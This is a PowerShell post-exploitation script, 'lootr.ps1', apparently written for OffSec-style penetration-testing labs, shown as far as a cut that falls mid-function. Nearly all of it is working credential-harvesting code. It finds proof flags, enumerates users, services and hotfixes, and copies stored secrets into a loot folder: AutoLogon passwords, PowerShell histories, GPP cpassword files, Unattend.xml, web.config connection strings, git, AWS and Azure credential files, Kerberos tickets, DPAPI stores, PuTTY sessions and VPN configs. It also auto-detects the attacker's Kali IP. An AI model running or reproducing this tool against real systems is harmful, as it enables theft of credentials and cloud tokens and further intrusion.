#==============================================================================
# LOOTR.PS1 — Post-Exploitation Loot Collection (Windows)
#==============================================================================
# Enumeration and collection ONLY — no exploitation, OffSec compliant.
# Requires PowerShell 5.1+
#
# PHASES:
#   1. proof    — Find local.txt / proof.txt
#   2. system   — OS, users, software, scheduled tasks, services
#   3. creds    — Passwords, registry, histories, wifi, config files
#   4. network  — Interfaces, routes, connections, shares, firewall
#   5. files    — Privesc vectors, writable paths, unquoted services
#
# USAGE:
#   .\lootr.ps1                       # all phases, output to .\loot\
#   .\lootr.ps1 -OutDir C:\loot       # custom output dir
#   .\lootr.ps1 -Quick                # skip slow enumeration
#   .\lootr.ps1 -Phase creds          # single phase only
#   .\lootr.ps1 -Help                 # show help
#==============================================================================

[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingWriteHost', '', Justification='Interactive console output with color is intentional for this operator-facing script.')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseBOMForUnicodeEncodedFile', '', Justification='The script is intentionally stored as UTF-8 without BOM for cross-platform editing.')]
param(
    [string]$OutDir = ".\loot",
    [switch]$Quick,
    [string]$Phase = "",
    [string]$KaliIp = "",
    [switch]$NoColor,
    [switch]$Help
)

#==============================================================================
# OUTPUT HELPERS
#==============================================================================
# Auto-detect: disable color when not interactive or NoColor requested
if ($NoColor -or ![Environment]::UserInteractive) { $script:UseColor = $false } else { $script:UseColor = $true }

function Write-Info {
    param($msg)
    $ts = "[$(Get-Date -f HH:mm:ss)] [*] $msg"
    if ($script:UseColor) { Write-Host $ts -ForegroundColor Cyan } else { Write-Host $ts }
}
function Write-Success {
    param($msg)
    $ts = "[$(Get-Date -f HH:mm:ss)] [+] $msg"
    if ($script:UseColor) { Write-Host $ts -ForegroundColor Green } else { Write-Host $ts }
}
function Write-Warn {
    param($msg)
    $ts = "[$(Get-Date -f HH:mm:ss)] [!] $msg"
    if ($script:UseColor) { Write-Host $ts -ForegroundColor Yellow } else { Write-Host $ts }
}
function Write-Err {
    param($msg)
    $ts = "[$(Get-Date -f HH:mm:ss)] [-] $msg"
    if ($script:UseColor) { Write-Host $ts -ForegroundColor Red } else { Write-Host $ts }
}
function Write-Phase {
    param($msg)
    $ts = "`n[$(Get-Date -f HH:mm:ss)] [PHASE] $msg`n"
    if ($script:UseColor) { Write-Host $ts -ForegroundColor Magenta } else { Write-Host $ts }
}

#==============================================================================
# PROGRESS TRACKING
#==============================================================================
function Write-ProgressLog {
    param(
        [string]$Dir,
        [string]$Status,
        [string]$PhaseName,
        [string]$Detail
    )
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$ts | $Status | $PhaseName | $Detail" | Out-File -Append -Encoding UTF8 "$Dir\progress.log"
}

function Test-PhaseDone {
    param($Dir, $PhaseName)
    if (-not (Test-Path "$Dir\progress.log")) { return $false }
    return [bool](Select-String -Path "$Dir\progress.log" -Pattern "\| DONE \| $PhaseName \|" -Quiet)
}

function Get-SafeLootCopyPath {
    param(
        [string]$DestinationDir,
        [string]$SourcePath
    )

    $leafName = Split-Path $SourcePath -Leaf
    $safeSource = ($SourcePath -replace '[:\\/\s]', '_').Trim('_')
    if (-not $safeSource) {
        $safeSource = [guid]::NewGuid().ToString()
    }

    return Join-Path $DestinationDir ("{0}_{1}" -f $leafName, $safeSource)
}

function Get-ExecutablePathFromCommandLine {
    param([string]$CommandLine)

    if (-not $CommandLine) { return "" }

    $expanded = [Environment]::ExpandEnvironmentVariables($CommandLine.Trim())
    $expanded = $expanded -replace '^[`''"]|[`''"]$', ''

    $quoted = [regex]::Match($expanded, '^\s*"([^"]+)"')
    if ($quoted.Success) { return $quoted.Groups[1].Value }

    $exePath = [regex]::Match($expanded, '^\s*([A-Za-z]:\\.*?\.exe)\b', 'IgnoreCase')
    if ($exePath.Success) { return $exePath.Groups[1].Value }

    $firstToken = [regex]::Match($expanded, '^\s*(\S+)')
    if ($firstToken.Success) { return $firstToken.Groups[1].Value }

    return ""
}

function Test-CurrentPrincipalCanWrite {
    param([string]$Path)

    if (-not (Test-Path $Path -ErrorAction SilentlyContinue)) { return $false }

    try {
        $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $principalNames = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)
        $null = $principalNames.Add($identity.Name)
        $null = $principalNames.Add("Everyone")
        $null = $principalNames.Add("BUILTIN\Users")
        $null = $principalNames.Add("NT AUTHORITY\Authenticated Users")

        foreach ($group in $identity.Groups) {
            try {
                $null = $principalNames.Add($group.Translate([System.Security.Principal.NTAccount]).Value)
            } catch { $null = $_ }
        }

        $acl = Get-Acl $Path -ErrorAction Stop
        foreach ($ace in $acl.Access) {
            if ($ace.AccessControlType -ne [System.Security.AccessControl.AccessControlType]::Allow) { continue }
            if (-not $principalNames.Contains($ace.IdentityReference.Value)) { continue }
            $rights = $ace.FileSystemRights
            if (($rights -band [System.Security.AccessControl.FileSystemRights]::FullControl) -ne 0 -or
                ($rights -band [System.Security.AccessControl.FileSystemRights]::Modify) -ne 0 -or
                ($rights -band [System.Security.AccessControl.FileSystemRights]::Write) -ne 0 -or
                ($rights -band [System.Security.AccessControl.FileSystemRights]::WriteData) -ne 0 -or
                ($rights -band [System.Security.AccessControl.FileSystemRights]::CreateFiles) -ne 0 -or
                ($rights -band [System.Security.AccessControl.FileSystemRights]::AppendData) -ne 0) {
                return $true
            }
        }
    } catch {
        return $false
    }

    return $false
}

#==============================================================================
# USAGE
#==============================================================================
function Show-Usage {
    Write-Host ""
    Write-Host "LOOTR.PS1 — Post-Exploitation Loot Collection (Windows)" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "Usage: .\lootr.ps1 [OPTIONS]" -ForegroundColor White
    Write-Host ""
    Write-Host "  -OutDir <path>   Output directory (default: .\loot)"
    Write-Host "  -Quick           Skip slow phases"
    Write-Host "  -Phase <name>    Single phase: proof|system|creds|network|files"
    Write-Host "  -KaliIp <ip>     Kali attacker IP (default: auto-detect from inbound sessions)"
    Write-Host "  -NoColor         Disable ANSI colors (auto-off when not interactive)"
    Write-Host "  -Help            Show this help"
    Write-Host ""
    Write-Host "Output structure:"
    Write-Host "  loot\<hostname>\"
    Write-Host "  ├── creds\       Credentials, registry, histories"
    Write-Host "  ├── system\      OS, users, software, tasks, services"
    Write-Host "  ├── network\     Interfaces, routes, connections"
    Write-Host "  ├── files\       Privesc vectors, writable paths"
    Write-Host "  ├── proof\       local.txt and proof.txt"
    Write-Host "  ├── progress.log Phase completion tracking"
    Write-Host "  ├── summary.txt  High-value findings at a glance"
    Write-Host "  ├── next_steps.txt Evidence-backed next actions"
    Write-Host "  └── attack_commands.txt Legacy alias of next_steps.txt"
    Write-Host ""
}

if ($Help) {
    Show-Usage
    exit 0
}

if ($Phase -and $Phase.ToLower() -notin @("proof", "system", "creds", "network", "files")) {
    Write-Err "Unknown phase: $Phase"
    Write-Err "Valid phases: proof system creds network files"
    exit 1
}

#==============================================================================
# PLATFORM GUARD
#==============================================================================
# $IsWindows is defined on PowerShell Core (6+). On Windows PowerShell 5.1
# it does not exist, but 5.1 only runs on Windows, so treat absence as Windows.
if ((Get-Variable -Name IsWindows -ErrorAction SilentlyContinue) -and -not $IsWindows) {
    Write-Host "[-] lootr.ps1 targets Windows hosts only. Current platform is not Windows." -ForegroundColor Red
    Write-Host "    For Linux targets, use lootr.sh instead." -ForegroundColor Yellow
    exit 1
}

#==============================================================================
# SETUP OUTPUT DIRECTORIES
#==============================================================================
$HostShort = $env:COMPUTERNAME
if (-not $HostShort) { $HostShort = "unknown" }

$LootDir = Join-Path $OutDir $HostShort

$SubDirs = @("creds", "system", "network", "files", "proof")
try {
    foreach ($sub in $SubDirs) {
        $null = New-Item -ItemType Directory -Force -Path (Join-Path $LootDir $sub) -ErrorAction Stop
    }
} catch {
    Write-Err "Failed to create output directory tree: $LootDir"
    Write-Err $_
    exit 1
}

Write-Host ""
Write-Host "  LOOTR — Post-Exploitation Loot Collection" -ForegroundColor Cyan
Write-Host "  Enumeration/collection only — no exploitation" -ForegroundColor Cyan
Write-Host ""
Write-Info "Output directory: $LootDir"
Write-Info "Hostname: $HostShort"
Write-Info "Running as: $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)"
if ($Quick) { Write-Warn "Quick mode enabled — skipping slow enumeration" }
if ($Phase) { Write-Info "Single phase mode: $Phase" }

# Detect Kali IP from active inbound session (RDP 3389, WinRM 5985/5986, SSH 22).
# The -KaliIp param overrides auto-detection — useful when delivered via reverse shell.
if (-not $KaliIp) {
    $KaliIp = (Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue |
        Where-Object { $_.LocalPort -in @(3389, 5985, 5986, 22) -and
                       $_.RemoteAddress -notmatch '^(127\.|::1)' } |
        Select-Object -First 1).RemoteAddress
}
if (-not $KaliIp) { $KaliIp = "<KALI_IP>" }
Write-Info "Kali IP (for attack commands): $KaliIp"

# Derive this host's primary non-loopback IPv4 for use in pivot/spray commands.
$ThisHostIp = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
    Where-Object { $_.IPAddress -notmatch '^(127\.|169\.254\.)' } |
    Sort-Object PrefixLength |
    Select-Object -First 1).IPAddress
if (-not $ThisHostIp) { $ThisHostIp = $env:COMPUTERNAME }

#==============================================================================
# PHASE 1 — PROOF FLAGS
#==============================================================================
function Invoke-PhaseProof {
    Write-Phase "1 — PROOF FLAGS"
    Write-ProgressLog -Dir $LootDir -Status "START" -PhaseName "proof" -Detail "Searching for proof flags"

    $ProofDir = Join-Path $LootDir "proof"
    $SearchPaths = @(
        "C:\Users\*\Desktop\local.txt",
        "C:\Users\*\Desktop\proof.txt",
        "C:\Users\*\local.txt",
        "C:\Users\*\proof.txt",
        "C:\local.txt",
        "C:\proof.txt",
        "C:\xampp\htdocs\local.txt",
        "C:\xampp\htdocs\proof.txt",
        "C:\inetpub\wwwroot\local.txt",
        "C:\inetpub\wwwroot\proof.txt"
    )

    $FoundAny = $false
    foreach ($pattern in $SearchPaths) {
        try {
            $matchResult = Get-Item -Path $pattern -ErrorAction SilentlyContinue
            foreach ($f in $matchResult) {
                $proofCopy = Get-SafeLootCopyPath -DestinationDir $ProofDir -SourcePath $f.FullName
                Write-Success "Found: $($f.FullName)"
                $content = Get-Content $f.FullName -ErrorAction SilentlyContinue
                Write-Host ""
                Write-Host "========================================" -ForegroundColor Green
                Write-Host "  FLAG: $($f.Name)" -ForegroundColor Green
                Write-Host "========================================" -ForegroundColor Green
                Write-Host $content -ForegroundColor Green
                Write-Host "========================================" -ForegroundColor Green
                Write-Host ""
                Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Red
                Write-Host "║  STOP — TAKE YOUR SCREENSHOTS BEFORE DOING ANYTHING ELSE    ║" -ForegroundColor Red
                Write-Host "║                                                              ║" -ForegroundColor Red
                Write-Host "║  Run this on target NOW:                                     ║" -ForegroundColor Red
                Write-Host "║    type $($f.Name) && hostname && whoami                     ║" -ForegroundColor Red
                Write-Host "║                                                              ║" -ForegroundColor Red
                Write-Host "║  Screenshot must show: flag + hostname + whoami              ║" -ForegroundColor Red
                Write-Host "║  ALL in the SAME terminal frame                              ║" -ForegroundColor Red
                Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Red
                Write-Host ""
                Copy-Item $f.FullName $proofCopy -ErrorAction SilentlyContinue
                $FoundAny = $true
            }
        } catch {
            $null = $_  # pattern may not match anything — expected
        }
    }

    if (-not $FoundAny) {
        Write-Warn "No proof flags found (local.txt / proof.txt)"
        # Broader search as fallback
        Write-Info "Running broader search (this may take a moment)..."
        try {
            $results = Get-ChildItem -Path "C:\" -Recurse -Include "local.txt","proof.txt" `
                -ErrorAction SilentlyContinue -Force | Select-Object -First 20
            foreach ($f in $results) {
                $proofCopy = Get-SafeLootCopyPath -DestinationDir $ProofDir -SourcePath $f.FullName
                Write-Success "Found (deep): $($f.FullName)"
                Write-Host ""
                Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Red
                Write-Host "║  STOP — TAKE YOUR SCREENSHOTS BEFORE DOING ANYTHING ELSE    ║" -ForegroundColor Red
                Write-Host "║                                                              ║" -ForegroundColor Red
                Write-Host "║  Run this on target NOW:                                     ║" -ForegroundColor Red
                Write-Host "║    type $($f.Name) && hostname && whoami                     ║" -ForegroundColor Red
                Write-Host "║                                                              ║" -ForegroundColor Red
                Write-Host "║  Screenshot must show: flag + hostname + whoami              ║" -ForegroundColor Red
                Write-Host "║  ALL in the SAME terminal frame                              ║" -ForegroundColor Red
                Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Red
                Write-Host ""
                Copy-Item $f.FullName $proofCopy -ErrorAction SilentlyContinue
                $FoundAny = $true
            }
        } catch {
            Write-Warn "Deep search failed: $_"
        }
    }

    Write-ProgressLog -Dir $LootDir -Status "DONE" -PhaseName "proof" -Detail "Proof flag search complete"
}

#==============================================================================
# PHASE 2 — SYSTEM INFO
#==============================================================================
function Invoke-PhaseSystem {
    Write-Phase "2 — SYSTEM INFO"
    Write-ProgressLog -Dir $LootDir -Status "START" -PhaseName "system" -Detail "Collecting system information"

    $SDir = Join-Path $LootDir "system"

    # systeminfo
    Write-Info "Collecting systeminfo..."
    try {
        systeminfo 2>&1 | Out-File -Encoding UTF8 "$SDir\systeminfo.txt"
        Write-Success "systeminfo collected"
    } catch {
        Write-Warn "systeminfo failed: $_"
    }

    # Current user context
    Write-Info "Collecting user context (whoami /all)..."
    try {
        whoami /all 2>&1 | Out-File -Encoding UTF8 "$SDir\whoami_all.txt"
        Write-Success "whoami /all collected"
    } catch {
        Write-Warn "whoami /all failed: $_"
    }

    # Local users
    Write-Info "Collecting local users..."
    try {
        Get-LocalUser | Format-Table Name, Enabled, LastLogon, PasswordRequired, PasswordLastSet -AutoSize 2>&1 `
            | Out-File -Encoding UTF8 "$SDir\local_users.txt"
        Write-Success "Local users collected"
    } catch {
        Write-Warn "Get-LocalUser failed: $_"
        net user 2>&1 | Out-File -Encoding UTF8 "$SDir\local_users.txt" -Append
    }

    # Local groups + admin members
    Write-Info "Collecting local groups and administrators..."
    try {
        $output = [System.Text.StringBuilder]::new()
        $null = $output.AppendLine("=== Local Groups ===")
        Get-LocalGroup | ForEach-Object {
            $null = $output.AppendLine("$($_.Name)")
        }
        $null = $output.AppendLine("")
        $null = $output.AppendLine("=== Administrators Group Members ===")
        Get-LocalGroupMember -Group "Administrators" 2>&1 | ForEach-Object {
            $null = $output.AppendLine("  $($_.Name)  [$($_.ObjectClass)]  PrincipalSource: $($_.PrincipalSource)")
        }
        $output.ToString() | Out-File -Encoding UTF8 "$SDir\local_groups.txt"
        Write-Success "Local groups collected"
    } catch {
        Write-Warn "Get-LocalGroup failed: $_"
        net localgroup 2>&1 | Out-File -Encoding UTF8 "$SDir\local_groups.txt"
        net localgroup Administrators 2>&1 | Out-File -Encoding UTF8 "$SDir\local_groups.txt" -Append
    }

    # Installed software (both registry hives)
    Write-Info "Collecting installed software..."
    try {
        $sw = @()
        $regPaths = @(
            "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*",
            "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*",
            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*"
        )
        foreach ($rp in $regPaths) {
            try {
                $sw += Get-ItemProperty $rp -ErrorAction SilentlyContinue |
                    Where-Object { $_.DisplayName } |
                    Select-Object -Property DisplayName, DisplayVersion, Publisher, InstallDate
            } catch { $null = $_ }
        }
        $sw | Sort-Object DisplayName | Format-Table -AutoSize |
            Out-File -Encoding UTF8 "$SDir\installed_software.txt"
        Write-Success "Installed software: $($sw.Count) entries"
    } catch {
        Write-Warn "Installed software collection failed: $_"
    }

    # Running processes
    Write-Info "Collecting running processes..."
    try {
        Get-Process | Select-Object Id, Name, CPU, WorkingSet, Path |
            Sort-Object Name | Format-Table -AutoSize 2>&1 |
            Out-File -Encoding UTF8 "$SDir\processes.txt"
        Write-Success "Processes collected"
    } catch {
        Write-Warn "Get-Process failed: $_"
    }

    # Scheduled tasks (non-Microsoft)
    Write-Info "Collecting scheduled tasks (non-Microsoft)..."
    try {
        Get-ScheduledTask 2>&1 |
            Where-Object { $_.TaskPath -notlike "\Microsoft\*" } |
            Select-Object TaskName, TaskPath, State |
            Format-Table -AutoSize |
            Out-File -Encoding UTF8 "$SDir\scheduled_tasks.txt"
        Write-Success "Scheduled tasks collected"
    } catch {
        Write-Warn "Get-ScheduledTask failed: $_"
        schtasks /query /fo LIST 2>&1 | Out-File -Encoding UTF8 "$SDir\scheduled_tasks.txt"
    }

    # Running services
    Write-Info "Collecting running services..."
    try {
        Get-Service -ErrorAction SilentlyContinue |
            Where-Object { $_.Status -eq "Running" } |
            Select-Object Name, DisplayName, Status |
            Format-Table -AutoSize |
            Out-File -Encoding UTF8 "$SDir\running_services.txt"
        Write-Success "Running services collected"
    } catch {
        Write-Warn "Get-Service failed: $_"
    }

    # Hotfixes / patches
    Write-Info "Collecting installed hotfixes..."
    try {
        Get-HotFix | Select-Object HotFixID, InstalledOn, Description |
            Sort-Object InstalledOn -Descending |
            Format-Table -AutoSize 2>&1 |
            Out-File -Encoding UTF8 "$SDir\hotfixes.txt"
        Write-Success "Hotfixes collected"
    } catch {
        Write-Warn "Get-HotFix failed: $_"
    }

    # Environment variables
    Write-Info "Collecting environment variables..."
    try {
        Get-ChildItem Env: | Format-Table Name, Value -AutoSize 2>&1 |
            Out-File -Encoding UTF8 "$SDir\environment.txt"
        Write-Success "Environment variables collected"
    } catch {
        Write-Warn "Environment collection failed: $_"
    }

    Write-Success "System info complete -> $SDir\"
    Write-ProgressLog -Dir $LootDir -Status "DONE" -PhaseName "system" -Detail "System info collected"
}

#==============================================================================
# PHASE 3 — CREDENTIALS
#==============================================================================
function Invoke-PhaseCredential {
    Write-Phase "3 — CREDENTIALS"
    Write-ProgressLog -Dir $LootDir -Status "START" -PhaseName "creds" -Detail "Collecting credentials"

    $CDir = Join-Path $LootDir "creds"

    # SAM / SYSTEM / SECURITY / NTDS — location note only
    Write-Info "Noting SAM/SYSTEM/SECURITY/NTDS locations (not copying — require SYSTEM)..."
    $HivePaths = @(
        "C:\Windows\System32\config\SAM",
        "C:\Windows\System32\config\SYSTEM",
        "C:\Windows\System32\config\SECURITY",
        "C:\Windows\NTDS\ntds.dit"
    )
    $hiveNotes = [System.Collections.Generic.List[string]]::new()
    foreach ($hp in $HivePaths) {
        if (Test-Path $hp) {
            $hiveNotes.Add("EXISTS: $hp")
            Write-Warn "Hive exists: $hp (requires SYSTEM or VSS to copy)"
        } else {
            $hiveNotes.Add("NOT FOUND: $hp")
        }
    }
    $hiveNotes | Out-File -Encoding UTF8 "$CDir\hive_locations.txt"

    # cmdkey stored credentials
    Write-Info "Checking stored credentials (cmdkey)..."
    try {
        cmdkey /list 2>&1 | Out-File -Encoding UTF8 "$CDir\cmdkey_list.txt"
        $cmdkeyContent = Get-Content "$CDir\cmdkey_list.txt" -ErrorAction SilentlyContinue
        if ($cmdkeyContent -match "Target:") {
            Write-Success "Stored credentials found in cmdkey!"
        }
    } catch {
        Write-Warn "cmdkey failed: $_"
    }

    # PSReadLine command history (all users) — also aggregate into powershell_history.txt
    # so attack_commands can grep a single file instead of iterating dynamic globs.
    Write-Info "Searching for PSReadLine history files..."
    $histPaths = @(
        "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
        "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    )
    $histCount = 0
    $histAgg = [System.Text.StringBuilder]::new()
    foreach ($hp in $histPaths) {
        try {
            $matchResult = Get-Item -Path $hp -ErrorAction SilentlyContinue
            foreach ($hf in $matchResult) {
                $safeName = $hf.FullName -replace "[:\\]", "_"
                Copy-Item $hf.FullName "$CDir\pshistory_$safeName.txt" -ErrorAction SilentlyContinue
                $null = $histAgg.AppendLine("=== $($hf.FullName) ===")
                $null = $histAgg.AppendLine((Get-Content $hf.FullName -Raw -ErrorAction SilentlyContinue))
                Write-Success "PSReadLine history: $($hf.FullName)"
                $histCount++
            }
        } catch { $null = $_ }
    }
    if ($histCount -gt 0) {
        $histAgg.ToString() | Out-File -Encoding UTF8 "$CDir\powershell_history.txt"
    } else {
        Write-Info "No PSReadLine history files found"
    }

    # AutoLogon registry — DefaultUserName / DefaultPassword in Winlogon
    Write-Info "Checking Winlogon for AutoLogon credentials..."
    try {
        $winlogonKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
        $al = Get-ItemProperty $winlogonKey -ErrorAction SilentlyContinue
        if ($al) {
            $alLines = [System.Collections.Generic.List[string]]::new()
            foreach ($prop in @("AutoAdminLogon","DefaultUserName","DefaultDomainName","DefaultPassword","AltDefaultUserName","AltDefaultPassword")) {
                $v = $al.$prop
                if ($null -ne $v -and "$v" -ne "") {
                    # Match attack_commands regex: "... REG_SZ <value>"
                    $alLines.Add("    $prop    REG_SZ    $v")
                }
            }
            if ($alLines.Count -gt 0) {
                $alLines | Out-File -Encoding UTF8 "$CDir\autologon.txt"
                if ($alLines -match "DefaultPassword") {
                    Write-Success "AutoLogon DefaultPassword present — see creds\autologon.txt"
                } else {
                    Write-Info "AutoLogon keys present but no DefaultPassword"
                }
            }
        }
    } catch {
        Write-Warn "Winlogon AutoLogon check failed: $_"
    }

    # Kerberos tickets (non-privileged; Rubeus is a manual follow-up)
    Write-Info "Collecting Kerberos ticket list (klist)..."
    try {
        $kOut = [System.Text.StringBuilder]::new()
        $null = $kOut.AppendLine("=== klist (current session) ===")
        $null = $kOut.AppendLine((klist 2>&1 | Out-String))
        # klist /li 0x3e7 = SYSTEM logon session (requires admin to view)
        $null = $kOut.AppendLine("=== klist /li 0x3e7 (SYSTEM session) ===")
        $null = $kOut.AppendLine((klist /li 0x3e7 2>&1 | Out-String))
        $kOut.ToString() | Out-File -Encoding UTF8 "$CDir\kerberos.txt"
        if ($kOut.ToString() -match "Server:|#\d+>") {
            Write-Success "Kerberos tickets present — see creds\kerberos.txt"
        }
    } catch {
        Write-Warn "klist failed: $_"
    }

    # DPAPI credentials + masterkeys (collect paths and file lists only — decryption requires key)
    Write-Info "Enumerating DPAPI credential + masterkey stores..."
    try {
        $dpapiRoots = @(
            "$env:APPDATA\Microsoft\Credentials",
            "$env:LOCALAPPDATA\Microsoft\Credentials",
            "$env:APPDATA\Microsoft\Protect",
            "$env:LOCALAPPDATA\Microsoft\Vault",
            "C:\Users\*\AppData\Roaming\Microsoft\Credentials",
            "C:\Users\*\AppData\Local\Microsoft\Credentials",
            "C:\Users\*\AppData\Roaming\Microsoft\Protect"
        )
        $dpapiLines = [System.Collections.Generic.List[string]]::new()
        foreach ($dr in $dpapiRoots) {
            try {
                $items = Get-ChildItem -Path $dr -Recurse -Force -File -ErrorAction SilentlyContinue |
                    Select-Object -First 50
                foreach ($it in $items) {
                    $dpapiLines.Add($it.FullName)
                }
            } catch { $null = $_ }
        }
        if ($dpapiLines.Count -gt 0) {
            $dpapiLines | Out-File -Encoding UTF8 "$CDir\dpapi_files.txt"
            Write-Success "DPAPI files enumerated: $($dpapiLines.Count) — see creds\dpapi_files.txt"
        }
    } catch {
        Write-Warn "DPAPI enumeration failed: $_"
    }

    # GPP Groups.xml on SYSVOL (MS14-025) — cpassword is AES-256-decryptable
    Write-Info "Checking SYSVOL for GPP Groups.xml (MS14-025)..."
    try {
        $dnsDomain = $env:USERDNSDOMAIN
        if ($dnsDomain) {
            $sysvolRoot = "\\$dnsDomain\SYSVOL\$dnsDomain\Policies"
            if (Test-Path $sysvolRoot -ErrorAction SilentlyContinue) {
                $gppFiles = Get-ChildItem -Path $sysvolRoot -Recurse -Force -ErrorAction SilentlyContinue `
                    -Include "Groups.xml","Services.xml","ScheduledTasks.xml","DataSources.xml","Drives.xml","Printers.xml" |
                    Select-Object -First 50
                $gppHits = [System.Collections.Generic.List[string]]::new()
                foreach ($gf in $gppFiles) {
                    try {
                        $content = Get-Content $gf.FullName -Raw -ErrorAction SilentlyContinue
                        if ($content -match 'cpassword\s*=\s*"[^"]+"') {
                            $gppHits.Add("CPASSWORD FOUND: $($gf.FullName)")
                            $safeName = $gf.FullName -replace "[:\\]","_"
                            Copy-Item $gf.FullName "$CDir\gpp_$safeName" -ErrorAction SilentlyContinue
                        }
                    } catch { $null = $_ }
                }
                if ($gppHits.Count -gt 0) {
                    $gppHits | Out-File -Encoding UTF8 "$CDir\gpp_cpassword.txt"
                    Write-Success "GPP cpassword found — see creds\gpp_cpassword.txt (MS14-025)"
                } else {
                    Write-Info "SYSVOL reachable, no cpassword= in Policies\*.xml"
                }
            } else {
                Write-Info "SYSVOL not reachable (not domain-joined or no route)"
            }
        } else {
            Write-Info "USERDNSDOMAIN not set — skipping SYSVOL scan"
        }
    } catch {
        Write-Warn "SYSVOL GPP scan failed: $_"
    }

    # Unattend.xml search
    Write-Info "Searching for Unattend.xml (sysprep credentials)..."
    $unattendPaths = @(
        "C:\Windows\Panther\Unattend.xml",
        "C:\Windows\Panther\Unattended.xml",
        "C:\Windows\System32\sysprep\Unattend.xml",
        "C:\Windows\System32\sysprep\Panther\Unattend.xml"
    )
    foreach ($up in $unattendPaths) {
        if (Test-Path $up) {
            Copy-Item $up "$CDir\$(Split-Path $up -Leaf)_$(Get-Random).xml" -ErrorAction SilentlyContinue
            Write-Success "Unattend.xml found: $up"
        }
    }

    # Web.config with connection strings
    Write-Info "Searching for Web.config files with credentials..."
    try {
        $webconfigs = Get-ChildItem -Path "C:\inetpub","C:\xampp" -Recurse -Include "web.config","Web.config" `
            -ErrorAction SilentlyContinue | Select-Object -First 20
        foreach ($wc in $webconfigs) {
            try {
                $content = Get-Content $wc.FullName -ErrorAction SilentlyContinue
                if ($content -match "connectionString|password|Password|pwd") {
                    $safeName = $wc.FullName -replace "[:\\]", "_"
                    Copy-Item $wc.FullName "$CDir\webconfig_$safeName.xml" -ErrorAction SilentlyContinue
                    Write-Success "Web.config with creds: $($wc.FullName)"
                }
            } catch { $null = $_ }
        }
    } catch {
        Write-Warn "Web.config search failed: $_"
    }

    # Credential keyword search in common paths
    Write-Info "Searching for credential patterns in common locations..."
    $searchDirs = @("C:\Users", "C:\inetpub", "C:\xampp", "C:\Program Files", "C:\Program Files (x86)")
    $credPatterns = "password|passwd|credentials|secret|api_key"
    $credFiles = [System.Collections.Generic.List[string]]::new()
    foreach ($sd in $searchDirs) {
        if (-not (Test-Path $sd)) { continue }
        try {
            $results = Select-String -Path "$sd\*" -Pattern $credPatterns `
                -Include "*.txt","*.ini","*.conf","*.config","*.xml","*.json","*.ps1","*.bat","*.cmd" `
                -Recurse -ErrorAction SilentlyContinue |
                Select-Object -First 50 |
                ForEach-Object { $_.Path }
            $credFiles.AddRange([string[]]($results | Select-Object -Unique))
        } catch { $null = $_ }
    }
    $credFiles | Select-Object -Unique | Out-File -Encoding UTF8 "$CDir\files_with_cred_patterns.txt"
    if ($credFiles.Count -gt 0) {
        Write-Success "Files with credential patterns: $($credFiles.Count) — see creds\files_with_cred_patterns.txt"
    }

    # .git-credentials
    Write-Info "Checking for .git-credentials..."
    $gitCredPaths = @(
        "$env:USERPROFILE\.git-credentials",
        "C:\Users\*\.git-credentials"
    )
    foreach ($gcp in $gitCredPaths) {
        try {
            $matchResult = Get-Item -Path $gcp -ErrorAction SilentlyContinue
            foreach ($gf in $matchResult) {
                $gitCopy = Get-SafeLootCopyPath -DestinationDir $CDir -SourcePath $gf.FullName
                Copy-Item $gf.FullName $gitCopy -ErrorAction SilentlyContinue
                Write-Success ".git-credentials: $($gf.FullName)"
            }
        } catch { $null = $_ }
    }

    # AWS credentials
    Write-Info "Checking for AWS credentials..."
    $awsPaths = @(
        "$env:USERPROFILE\.aws\credentials",
        "C:\Users\*\.aws\credentials"
    )
    foreach ($ap in $awsPaths) {
        try {
            $matchResult = Get-Item -Path $ap -ErrorAction SilentlyContinue
            foreach ($af in $matchResult) {
                $awsCopy = Get-SafeLootCopyPath -DestinationDir $CDir -SourcePath $af.FullName
                Copy-Item $af.FullName $awsCopy -ErrorAction SilentlyContinue
                Write-Success "AWS credentials: $($af.FullName)"
            }
        } catch { $null = $_ }
    }

    # Azure credentials
    Write-Info "Checking for Azure credentials..."
    $azurePaths = @(
        "$env:USERPROFILE\.azure\accessTokens.json",
        "$env:USERPROFILE\.azure\azureProfile.json"
    )
    foreach ($azp in $azurePaths) {
        if (Test-Path $azp) {
            Copy-Item $azp "$CDir\$(Split-Path $azp -Leaf)" -ErrorAction SilentlyContinue
            Write-Success "Azure credential file: $azp"
        }
    }

    # PuTTY saved sessions
    Write-Info "Checking PuTTY saved sessions..."
    try {
        $puttySessions = Get-ItemProperty "HKCU:\Software\SimonTatham\PuTTY\Sessions\*" -ErrorAction SilentlyContinue
        if ($puttySessions) {
            $puttySessions | Select-Object PSChildName, HostName, UserName, PortNumber |
                Format-Table -AutoSize | Out-File -Encoding UTF8 "$CDir\putty_sessions.txt"
            Write-Success "PuTTY sessions found: $($puttySessions.Count)"
        } else {
            Write-Info "No PuTTY sessions found"
        }
    } catch {
        Write-Warn "PuTTY registry check failed: $_"
    }

    # OpenVPN config files
    Write-Info "Searching for .ovpn files..."
    try {
        $ovpnFiles = Get-ChildItem -Path "C:\" -Recurse -Include "*.ovpn" `
            -ErrorAction SilentlyContinue | Select-Object -First 10
        foreach ($of in $ovpnFiles) {
            $safeName = $of.Name -replace "[:\\]","_"
            Copy-Item $of.FullName "$CDir\ovpn_$safeName" -ErrorAction SilentlyContinue
            Write-Success "VPN config: $($of.FullName)"
        }
    } catch {
